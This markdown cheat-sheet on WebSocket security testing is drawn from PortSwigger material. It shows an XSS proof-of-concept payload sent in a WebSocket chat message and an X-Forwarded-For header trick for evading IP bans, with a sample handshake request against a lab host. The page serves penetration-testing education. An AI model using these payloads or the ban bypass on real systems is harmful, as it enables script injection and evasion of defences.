 # WebSockets security vulnerabilities

>  Finding WebSockets security vulnerabilities generally involves manipulating them in ways that the application doesn't expect. You can do this using a Proxy Intercept tool.

You can use a Proxy Intercept tool to:

- Intercept and modify WebSocket messages.
- Replay and generate new WebSocket messages.
- Manipulate WebSocket connections.


## Summary
- [WebSockets security vulnerabilities](#websockets-security-vulnerabilities)
  - [Summary](#summary)
  - [Exploits](#exploits)
    - [Bypass "Banned IP Adress"](#bypass-%22banned-ip-adress%22)
  - [References](#references)

## Exploits

:fire: **example :** 

suppose a chat application uses WebSockets to send chat messages between the browser and the server. When a user types a chat message, a WebSocket message like the following is sent to the server: 
 
 ```bash
{"message":"Hello World!"} 
 ```

 The contents of the message are transmitted (again via WebSockets) to another chat user, and rendered in the user's browser as follows: 

  <td>Hello World!</td> 

   In this situation, provided no other input processing or defenses are in play, an attacker can perform a proof-of-concept XSS attack by submitting the following WebSocket message:

```bash
{"message":"<img src=1 onerror='alert(1)'>"} 
```

### Bypass "Banned IP Adress"

sometimes the attack will be blocked and the IP will be banned, then you can bypass this by adding 

```bash
X-Forwarded-For: 1.1.1.1
#Add this before Upgrade: websocket
```
:fire: **example :**

```bash
GET /chat HTTP/1.1
Host: sub.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Sec-WebSocket-Version: 13
Origin: https://sub.web-security-academy.net
Sec-WebSocket-Key: reH5VTid3ChcIVhSdK3Zaw==
DNT: 1
Connection: keep-alive, Upgrade
Cookie: session=UIhNzeBLaTsoCfHfQsFFPyKQRRUIVf5k
Pragma: no-cache
Cache-Control: no-cache
X-Forwarded-For: 1.1.1.1
Upgrade: websocket
```

## References
* [Portswigger](https://portswigger.net/web-security/websockets)
